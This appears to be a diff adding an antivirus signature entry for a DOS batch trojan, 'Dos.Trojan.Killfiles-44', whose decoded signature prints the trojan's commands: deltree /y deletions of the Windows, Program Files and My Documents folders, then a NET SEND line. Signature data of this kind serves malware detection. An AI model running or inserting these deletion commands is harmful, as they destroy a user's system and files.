@@ -1,0 +1,13 @@
+VIRUS NAME: Dos.Trojan.Killfiles-44
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+.bat
+goto del
+del:
+deltree /y C:\WINDOWS\*.*
+deltree /y C:\Program Files\*.*
+deltree /y C:\My Documents\*.*
+goto msg
+msg:
+NET SEND 127.0.0
